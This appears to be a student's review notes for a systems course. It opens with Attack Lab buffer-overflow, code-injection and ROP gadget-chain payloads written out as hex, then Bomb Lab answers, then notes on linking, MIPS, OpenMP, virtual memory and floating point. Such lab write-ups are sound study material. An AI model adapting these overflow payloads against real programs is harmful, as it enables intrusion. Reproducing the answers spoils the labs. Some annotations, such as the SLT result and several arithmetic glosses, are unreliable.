@@ -1,0 +1,608 @@
+Final Review
+==============================================================
+1. Attack Lab
+Dump of assembler code for function getbuf:
+   0x0000000000401848 <+0>:	sub    $0x38,%rsp =>buffer size=0x38
+   0x000000000040184c <+4>:	mov    %rsp,%rdi =>content on curret stack->parameter 1
+   0x000000000040184f <+7>:	callq  0x401a8a <Gets>
+   0x0000000000401854 <+12>:	mov    $0x1,%eax =>return 1
+   0x0000000000401859 <+17>:	add    $0x38,%rsp =>shrink stack
+   0x000000000040185d <+21>:	retq   
+End of assembler dump.
+
+Phase 1: Return to touch1
+-Break after <Gets>
+-x/64bx $rsp
+-Find return address (56 bytes after current $rsp)
+-Overflow the return address with the address of touch1
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+5e 18 40 00 00 00 00 00
+
+Phase 2: Return to touch2 and pass cookie as the argument of touch2
+-Break after <Gets>
+-x/72bx $rsp
+-We need movq [cookie], %rdi
+-Write assembly code
+	movq $0x5561a088,%rdi
+	retq
+-$ gcc -c phase2.s
+-Get the binary code for the movq instruction
+0000000000000000 <.text>:
+   0:	48 c7 c7 56 db eb 76 	mov    $0x76ebdb56,%rdi
+   7:	c3                   	retq   
+-How to execute the movq instruction:
+	-The address of $rsp is 0x5561a088
+	-We need to return to this address in order to execute the instruction
+	-Overflow the return address with the address of $rsp
+-When the instruction on $rsp returns (c3), it will go back to the next line of the last return address
+-touch2 is the next return address
+
+48 c7 c7 56 db eb 76 c3 ->ret to 2nd ret addr
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 ->end of buffer 
+88 a0 61 55 00 00 00 00 ->1st ret addr (addr of mov instruction on stack)
+8a 18 40 00 00 00 00 00 ->2nd ret addr
+
+Phase 3: Return to test and pass cookie string as the argument
+-We need movq [cookie string], %rdi
+-[cookie string] contains 8 digits, or 8 bytes. We can place the string on stack and move the content on stack to %rdi
+-Write assembly code
+	movq [address of where I store cookie string on stack], %rdi
+	retq
+-Note: string ends with a null byte
+	-37 36 65 62 64 62 35 36 00
+	-I left the next line empty for alignment
+
+37 36 65 62 64 62 35 36 ->cookie string
+00 00 00 00 00 00 00 00
+48 c7 c7 88 a0 61 55 c3 ->mov cookie string to %rdi, ret to 2nd addr
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 ->end of buffer
+98 a0 61 55 00 00 00 00 ->1st ret addr (addr of mov instruction on stack)
+5e 19 40 00 00 00 00 00 ->2nd ret addr (test)
+
+Phase 4: Repeat Phase 2 with gadgets
+-We want to move the cookie (on stack) to %rdi
+-In gadget farm (start_farm to mid_farm), find instructions:
+	-pop $rax: 58 (pop data from stack to %rax, data needs to be in $rsp at this point)
+	-mov $rax, %rdi: 48 89 c7
+	-retq: c3
+-We first go to pop, pop returns to 2nd ret addr, mov returns to 3rd ret addr
+
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 ->end of buffer
+02 1a 40 00 00 00 00 00 ->1st ret addr: go to 58 90 90 90 c3
+56 db eb 76 00 00 00 00 ->cookie(on stack, move to %rax)
+1d 1a 40 00 00 00 00 00 ->2nd ret addr: go to 48 89 c7 c3
+8a 18 40 00 00 00 00 00 ->3rd ret addr to touch2
+
+Phase 5: Repeat Phase 3 with gadgets
+-We need to store [cookie string] on stack and move %rsp(with possible displacement) to %rdi
+-Moving the content of %rsp to another register, we need to use lea
+	-One useful gadget we can use: lea (%rdi, %rsi, 1), %rax (0x401a28)
+-[cookie string] should be stored at %rdi+%rsi on stack
+-The following mov instructions between registers are potentially useful:
+	-Note: we can ignore binary code of nop instructions
+	-48 89 c7 c3: rax->rdi
+	-89 c7 c3: eax->edi
+	-89 c2 90 c3: eax->edx
+	-89 e0 c3: esp->eax
+	-89 ce 90 90 c3: ecx->esi
+	-89 d1 90 c3: edx->ecx
+	-48 89 e0 c3: rsp->rax
+-Address of cookie string: rsp->rax->rdi
+	-0x401a43: 48 89 e0 c3
+	-0x4019f4: 48 89 c7 c3
+	-%rdi now has %rsp, which is the address of f4 19 40 00 00 00 00 00
+	-We need to provide a displacement value on stack
+-Displacement: esp->eax->edx->ecx->esi
+	-0x401a10: 89 c7 c3, ($esp) is 0x48
+	-0x401a3e: 89 c2 90 c3 
+	-0x401abb: 89 d1 90 c3
+	-0x401aea: 89 ce 90 c3
+	-%esi now has the displacement value, (%rdi + %rsi) = [cookie string]
+-After lea (%rdi, %rsi, 1), %rax, we have [cookie string] in %rax, and we need to move it to %rdi
+	-0x401a28: lea instruction
+	-0x4019f4: 48 89 c7 c3
+-Where do we put the cookie string?
+	-I placed it after all the code exploitation, so the displacement is 0x48 from the address contained in %rdi
+
+
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 ->end of buffer
+43 1a 40 00 00 00 00 00 ->rsp=>rax
+f4 19 40 00 00 00 00 00 ->rax=>rdi, %rdi contains this address
+10 1a 40 00 00 00 00 00 ->esp=>eax
+48 00 00 00 00 00 00 00 ->esp
+3e 1a 40 00 00 00 00 00 ->eax=>edx
+bb 1a 40 00 00 00 00 00 ->edx=>ecx
+ea 1a 40 00 00 00 00 00 ->ecx=>esi
+28 1a 40 00 00 00 00 00 ->lea (%rdi, %rsi, 1), %rax
+f4 19 40 00 00 00 00 00 ->rax=>rdi
+5e 19 40 00 00 00 00 00 ->ret addr: test
+37 36 65 62 64 62 35 36 ->cookie string
+00 00 00 00 00 00 00 00 ->this extra line contains a null byte
+
+
+==============================================================
+2. Bomb lab
+Phase 1: <string_not_equal>
+Dump of assembler code for function phase_1:
+   0x00000000004011f3 <+0>:	sub    $0x8,%rsp ->allocate 8B on stack
+   0x00000000004011f7 <+4>:	mov    $0x4023c8,%esi ->move to esi
+   0x00000000004011fc <+9>:	callq  0x40123c <strings_not_equal>
+   	-Compare string length
+   	-Compare each character in a loop
+   0x0000000000401201 <+14>:	test   %eax,%eax ->check if eax==0
+   0x0000000000401203 <+16>:	je     0x40120a <phase_1+23>
+   0x0000000000401205 <+18>:	callq  0x401426 <explode_bomb>
+   0x000000000040120a <+23>:	add    $0x8,%rsp
+   0x000000000040120e <+27>:	xchg   %ax,%ax
+   0x0000000000401210 <+29>:	retq   
+End of assembler dump.
+
+-Input string needs to be the same as the string stored in 0x4023c8
+-x/1s 0x4023c8
+	"Verbosity leads to unclear, inarticulate things."
+
+Phase 2: <read_six_numbers>
+Dump of assembler code for function phase_2:
+   0x000000000040105a <+0>:	push   %rbp
+   0x000000000040105b <+1>:	push   %rbx
+   0x000000000040105c <+2>:	sub    $0x28,%rsp
+   0x0000000000401060 <+6>:	mov    %rsp,%rsi
+   0x0000000000401063 <+9>:	callq  0x40145c <read_six_numbers>
+   0x0000000000401068 <+14>:	cmpl   $0x3,(%rsp) ->1st number has to be 3
+   0x000000000040106c <+18>:	je     0x401073 <phase_2+25>
+   0x000000000040106e <+20>:	callq  0x401426 <explode_bomb>
+   0x0000000000401073 <+25>:	mov    %rsp,%rbp
+   0x0000000000401076 <+28>:	lea    0x4(%rsp),%rbx
+   0x000000000040107b <+33>:	add    $0x18,%rbp
+   0x000000000040107f <+37>:	mov    -0x4(%rbx),%eax
+   0x0000000000401082 <+40>:	add    %eax,%eax ->curr_number*2
+   0x0000000000401084 <+42>:	cmp    %eax,(%rbx) ->next_num=eax=curr_num*2
+   0x0000000000401086 <+44>:	je     0x40108d <phase_2+51>
+   0x0000000000401088 <+46>:	callq  0x401426 <explode_bomb>
+   0x000000000040108d <+51>:	add    $0x4,%rbx
+   0x0000000000401091 <+55>:	cmp    %rbp,%rbx
+   0x0000000000401094 <+58>:	jne    0x40107f <phase_2+37>
+   0x0000000000401096 <+60>:	add    $0x28,%rsp
+   0x000000000040109a <+64>:	pop    %rbx
+   0x000000000040109b <+65>:	pop    %rbp
+   0x000000000040109c <+66>:	retq   
+End of assembler dump.
+
+-Input number has to start with 3, each number after it is twice the previous number.
+	3 6 12 24 48 96
+
+Phase 3: jump table
+	2 321
+
+Phase 4: 
+Dump of assembler code for function phase_4:
+   0x00000000004010e1 <+0>:	sub    $0x18,%rsp
+   0x00000000004010e5 <+4>:	lea    0x8(%rsp),%rcx
+   0x00000000004010ea <+9>:	lea    0xc(%rsp),%rdx
+   0x00000000004010ef <+14>:	mov    $0x4024fc,%esi
+   0x00000000004010f4 <+19>:	mov    $0x0,%eax
+   0x00000000004010f9 <+24>:	callq  0x400ac8 <__isoc99_sscanf@plt>
+   0x00000000004010fe <+29>:	cmp    $0x2,%eax ->input starts with 2
+   0x0000000000401101 <+32>:	jne    0x401110 <phase_4+47>
+   0x0000000000401103 <+34>:	mov    0xc(%rsp),%eax ->move 12 after rsp to eax, 4th number
+   0x0000000000401107 <+38>:	test   %eax,%eax ->eax cant be signed
+   0x0000000000401109 <+40>:	js     0x401110 <phase_4+47>
+   0x000000000040110b <+42>:	cmp    $0xe,%eax ->eax<15
+   0x000000000040110e <+45>:	jle    0x401115 <phase_4+52>
+   0x0000000000401110 <+47>:	callq  0x401426 <explode_bomb>
+   0x0000000000401115 <+52>:	mov    $0xe,%edx ->edx=12
+   0x000000000040111a <+57>:	mov    $0x0,%esi ->esi=0
+   0x000000000040111f <+62>:	mov    0xc(%rsp),%edi ->move 12 after rsp to edi, 4th number
+   0x0000000000401123 <+66>:	callq  0x400e70 <func4>
+   0x0000000000401128 <+71>:	cmp    $0x4,%eax ->func4 needs to return 4
+   0x000000000040112b <+74>:	jne    0x401134 <phase_4+83>
+   0x000000000040112d <+76>:	cmpl   $0x4,0x8(%rsp) ->2nd=4
+   0x0000000000401132 <+81>:	je     0x401139 <phase_4+88>
+   0x0000000000401134 <+83>:	callq  0x401426 <explode_bomb>
+   0x0000000000401139 <+88>:	add    $0x18,%rsp
+   0x000000000040113d <+92>:	retq   
+End of assembler dump.
+
+-Ans: 2 4
+
+Phase 5:
+Dump of assembler code for function phase_5:
+   0x000000000040109d <+0>:	push   %rbx
+   0x000000000040109e <+1>:	mov    %rdi,%rbx
+   0x00000000004010a1 <+4>:	callq  0x401220 <string_length>
+   0x00000000004010a6 <+9>:	cmp    $0x6,%eax ->stringlength=6
+   0x00000000004010a9 <+12>:	je     0x4010b0 <phase_5+19>
+   0x00000000004010ab <+14>:	callq  0x401426 <explode_bomb>
+   0x00000000004010b0 <+19>:	lea    0x6(%rbx),%rsi 
+   0x00000000004010b4 <+23>:	mov    $0x0,%eax
+   0x00000000004010b9 <+28>:	mov    $0x402440,%edx ->edx is the array start
+   0x00000000004010be <+33>:	movsbq (%rbx),%rcx ->rbx stores my input string, move to rcx
+   0x00000000004010c2 <+37>:	and    $0xf,%ecx
+   0x00000000004010c5 <+40>:	add    (%rdx,%rcx,4),%eax ->eax+=rdx+4*index=array[rcx]
+   0x00000000004010c8 <+43>:	add    $0x1,%rbx
+   0x00000000004010cc <+47>:	cmp    %rsi,%rbx
+   0x00000000004010cf <+50>:	jne    0x4010be <phase_5+33>
+   0x00000000004010d1 <+52>:	cmp    $0x39,%eax ->eax=57
+   0x00000000004010d4 <+55>:	je     0x4010db <phase_5+62>
+   0x00000000004010d6 <+57>:	callq  0x401426 <explode_bomb>
+   0x00000000004010db <+62>:	pop    %rbx
+   0x00000000004010dc <+63>:	nopl   0x0(%rax)
+   0x00000000004010e0 <+67>:	retq   
+End of assembler dump.
+
+(gdb) x/128bx 0x402440
+0x402440 <array.3310>:	0x02	0x00	0x00	0x00	0x06	0x00	0x00	0x00
+0x402448 <array.3310+8>:	0x0a	0x00	0x00	0x00	0x01	0x00	0x00	0x00
+0x402450 <array.3310+16>:	0x0c	0x00	0x00	0x00	0x10	0x00	0x00	0x00
+0x402458 <array.3310+24>:	0x09	0x00	0x00	0x00	0x03	0x00	0x00	0x00
+0x402460 <array.3310+32>:	0x07	0x00	0x00	0x00	0x04	0x00	0x00	0x00
+0x402468 <array.3310+40>:	0x0e	0x00	0x00	0x00	0x05	0x00	0x00	0x00
+0x402470 <array.3310+48>:	0x0b	0x00	0x00	0x00	0x08	0x00	0x00	0x00
+0x402478 <array.3310+56>:	0x0f	0x00	0x00	0x00	0x0d	0x00	0x00	0x00
+
+-We need to have a string of digits, which are the indice of array at 0x402440. The sum of the array elements at these indice is equal to 0x39.
+-456753 -> indice of array
+-a[4]+a[5]+...+a[3] = 57
+-12+16+9+3+16+1=57
+
+Phase 6
+-By looking at mov    $0x603750,%esi, we find a linked list with six nodes. In each node, there is an integer data, its index, and the address to the next node.
+-We need to order the linked list from the smallest to the largest element.
+-2 4 5 1 6 3 => 1st node is the second smallest, 4th node is the smallest, etc
+
+
+==============================================================
+3. Linking
+
+Why do we need linking?
+-dont have to recompile everything every time we make a modification.
+-reuse codes, use libraries. update libraries only instead of recompiling all the codes.
+
+Static linking
+-Have multiple files: main.c, sum,c
+-Invocation of sum in main
+-Translator: compile source files independently, form relocatable object files
+-Linker: Link object files together, take main.o and sum.o and form executable
+-Portable binary as long as ISA is the same
+
+Why linking:
+-Modularity
+	collection of smaller files: easy to find and modify, common functions(math, I/O) built as a library, perfect library
+-Efficiency
+	Time: Modify and recompile only the file that is changed
+	Space: store in one place and reuse
+
+What do linkers do?
+-Symbol resolution
+	Symbol: global variables and functions
+	Symbol table: name, size, location
+	Linker associate symbol reference with definition
+-Relocation
+	Merge separate code and data sections into single sections
+	Concrete memory locations
+
+
+Three kinds of object files
+	Relocatable file .o
+		code and date, can combine with other .o files
+	Executable object file a.out
+		ready to be executed, after linking is done
+	Shared object file .so
+		relocatable object file that can be loaded into memory and linked dynamically at load time or runtime
+		new versions of .so without recompiling legacy codes
+		=DLL
+
+Executable and Linkable format, ELF
+
+Linker symbols
+	Global
+	External: reference in the module, defined somewhere else globally
+	Local
+
+Two ways to package commonly used functions into a libary:
+1. toolkit.c
+Put all functions into one single source file.
+Link big file easily, waste space and time.
+2. many files
+Separate source files
+Explicitly link appropriate binaries into their programs. Burdensome for programmers.
+
+Solution
+-Static libraries (.a archive files)
+	Concatenate related .o into a file of indice (archive)
+	Search archive to find unresolved external references
+	Link the archive member
+	Linker does the search instead of the programmer
+	Duplication in the stored executables(every function needs libc), running executables
+	Bug fix of lib require relinks of every application
+-Shared libraries (modern)
+	Link dynamically at load/run time, DLL or .so files, handled by the dynamic linker
+	Shared by multiple processes
+	***Virtual memory
+
+Library
+-Benefits: reuse optimized codes in other programs, frequently used, such as sorting and I/O, dont have to recreate and optimize every time
+
+
+Dynamic linking
+-Multiple programs: a.exe, b.exe both use libc, could be really large
+1. In physical memory, libc.o are present in multiple locations, could be shared
+overlap at runtime, inefficiency
+2. Update dll
+Not recompiling, just change DLL and pull them onto PC, and software programming
+Common interface in lib and updating implementation
+
+Loader: loaded a progress into memory and begin execution
+Locate and pull DLLs
+DLLs could also be pulled during runtime
+If DLL is already in memory, loader will just link the object file with the DLL
+
+Why do we need static linking: other users dont have the lib on their system
+
+Static linking: has to relink
+Dynamic linking: only loader
+
+
+Interpositioning
+Basic idea: add additional implementation to existing code, use your own DLLs (same interface as DLL)
+Compile time: #define malloc myMalloc
+
+
+Virtual memory simplifies linking and loading
+-Similar linking address space, starting at the same address
+-Execve performs the same for many programs 
+
+Summary:
+1. Avoid recompilation
+2. Link at load/run time by linker, shared by multiple processes to avoid duplication in memory space
+3. Easy to update
+
+
+
+
+==============================================================
+3. MIPS
+-32-bit instructions
+-Load and store, operands only on registers
+-Variables load into reg, perform operations, result store back into memory
+
+1. Load and Store
+Load word to register:
+lw rt, offset(rs) -> Reg[rt] = Mem[Reg[rs]+SignExtend(offset)]
+	-Why SE? offset is 16-bit, we extend it to 32-bit
+Store word to memory:
+sw rt, offset(rs) -> Mem[Reg[rs]+SignExtend(offset)] = Reg[rt]
+lb(store lower bytes), lbu(unsigned extend), sb
+
+If displace> 16-bit, we need to perform addition.
+
+2. Arithmetic
+ADD rd,rs,rt ->rd=rs+rt
+ADDI rt,rs,imm ->rt=rs+SE(imm)
+
+3. Branching
+BEQ rs,rt,label ->goto label if (Reg[rs]==Reg[rt]), PC+=4
+BNE rs,rt,label ->goto label if (Reg[rs]!=Reg[rt]), PC+=4
+SLT rd,rs,rt ->if rs<rt, rd=-1, else rd=0
+	SLTU: rs,rt unsigned
+-like je, jne, jl
+
+4. Jump
+J label ->unconditional
+JR rs ->jump to Reg[rs], which is an addr
+JAL label ->jump and link, set return address=$31 => callq
+JALR rs,rd ->jump to Reg[rs], set return address=Reg[rd]
+JR $31 ->retq
+
+5. Logic
+AND rd,rs,rt ->rd=AND(rs,rt)
+ANDI rt,rs,imm ->rt=AND(rs,SE(imm))
+load upper:
+LUI rt,imm ->upper 16bits of Reg[rt] = imm, lower = 0
+
+
+\n A = 5  \n B = 10
+
+Translate x86 instruction to MIPS:
+x86 add D(rax, rbx), rcx    -> rcx = rcx + Mem[rax+rbx+D]
+		Dest: rcx
+		Source: Mem[rax+rbx+D]
+MIPS
+	ADD t0, rax, rbx   -> rax+rbx
+	lw t1, D(t0)	   -> load Mem[D+rax+rbx] into a reg
+	ADD rcx, rcx, t1   -> rcx = rcx + Mem[rax+rbx+D]
+
+==============================================================
+4. Parallelism
+(1)Loop unrolling (nx1): operate on n elements at a time
+(2)Reassociate computation: break sequential dependencies
+	Use more local var, separate accumulators
+(3)Blocking
+(4)OpenMP
+	-#pragma omp parallel for: fork, for loop execute in parallel
+	-#pragma omp parallel num_threads(T)
+		int omp_get_num_procs();
+		void omp_set_num_threads(int);
+	-#pragma omp parallel for private(j) ->code wont work if j is not private
+	-firstprivate:
+		inherit shared variable upon loop entry, not per iteration
+	-lastprivate
+		At the end of join, sequentially last loop assigns the shared variable upon loop exit
+	-#pragma omp parallel: create forks
+		-#pragma omp for: inside parallel section, worksharing construct
+			Barrier at the end of loop
+		-#pragma omp single: inside parallel section, only a single thread execute the code
+	-nowait: no need for a barrier synchronization at the end of a parallel for loop or single
+	-Locking code
+		-critical: handle mutual exclusion, only one thread will execute at one time
+		-reduction(OP:var): private accumulator and contribute to a global result
+	-Locking data
+		omp_lock_t hash_lock[HASH_TABLE_SIZE]
+		omp_init_lock (&hash_lock[i]) //inside main
+		  -> mutual exclusion on hash table data
+		-inside code: insert_element()
+			omp_set_lock(&hash_lock[i]);
+			/* Code */
+			omp_unset_lock(&hash_lock[i]);
+		-avoid deadlock
+
+Strategies
+(1)Domain decomposition
+	Each CPU performs on a part of data, no dependency until the end
+	Not working when there is dependence between iteration: a[i]=a[i-1]*b[i]
+(2)Task decomposition
+	Divide functionsd among processors
+(3)Pipelining
+	3D rendering of graph
+	Overlapping in time, each task in a different stage
+	Steady stage: each CPU has a piece of data
+
+Fork/join programming model:
+	Master thread perfomrs sequential portions
+	Fork: form threads
+	Join: join threads
+
+Understand loop assembly code:
+	for loop: 
+		move 0 to incrementer
+		goto test
+	  loop:
+		loop body
+		increment
+	  test:
+		cmp incrementer
+		jle loop
+
+	do-while loop:
+	  loop:
+		loop body
+		increment
+		cmp
+		jle loop
+		
+	while loop:
+		move 0 to incrementer
+		goto test
+	  loop:
+		loop body
+		increment
+	  test:
+		cmp incrementer
+		jle loop
+
+==============================================================
+5. Optimization (not parallelism)
+(1)Code motion: moving code out of loop
+	part of index computation
+(2)Reduction in strength:multi->shift/add
+(3)Share common expression
+(4)Reduce procedure calls:move strlen() out of loop
+(5)Memory aliasing: do not look up same memory content frequently
+	introduce local var
+(6)Spatial locality:cache-friendly, focus on inner loops
+	not in innermost loop, cache miss rate = 0
+
+=================================
+6. Recursion
+recursion_func:
+	base case
+	jump to .L
+
+	push callee-saved to stack
+	recursive case
+	call recursion_func
+	pop callee-saved from stack
+
+  .L:
+  	ret
+
+On stack:
+
+return address to previous recursive call
+callee-saved
+callee-saved
+padding
+argument
+
+=================================
+7. ECF
+Asynchronous exceptions (external):
+	interrupt pin
+Synchronous exceptions (internal):
+	Traps: intentional, system calls. breakpoints
+	Faults: unintentional recoverable, writing to a page on disk(not in memory yet)
+	Aborts: unintentional unrecoverable
+
+=================================
+8. Virtual memory
+Why: Use main memory, simplifies memory management, isolate address spaces
+Caching: DRAM is a cache of disk
+	Page Table:
+	VA -> PT -> PM
+		Page hit: Reference to VM is in DRAM
+		Page miss: Reference to VM is not in DRAM and needs to be brought in from disk (page fault)
+Memory management
+	Linking and loading
+	Share data and code
+
+=================================
+9. Floating point
+32-bit  (-1)^s M 2^E
+s    exp             m
+0 00000000 00000000000000000000000
+
+sign bit: 0pos 1neg
+exp = E+bias   (2^6 -> exp = 6+127=133 in decimal)
+
+exp = all 0, denormalized value, E = 1-bias = -126
+
+exp = all 1, special:
+1 11111111 00000000000000000000000 -> negative infinity
+0 11111111 00000000000000000000000 -> positive infinity
+
+Decode: (bias=7)
+0 0000 111 -> (7/8)*2^-6=7/512
+0 0000 101 -> (5/8)*2^-6=5/512
+0 0000 001 -> (1/8)*2^-6=1/512
+
+0 0101 101 -> (1+5/8)*2^-2=13/32
+0 0110 111 -> (1+7/8)*2^-1=15/16
+0 0001 111 -> (1+7/8)*2^-6=15/512
+0 0001 001 -> (1+1/8)*2^-6=9/512
+
+Encode: (bias=127)
+7.89 = 111.111....... = 1.11111..... * 2^2
+frac: 11111....
+exp: 2+12=129
+sign: 0
+0 10000001 11111.....
+
+
+
+
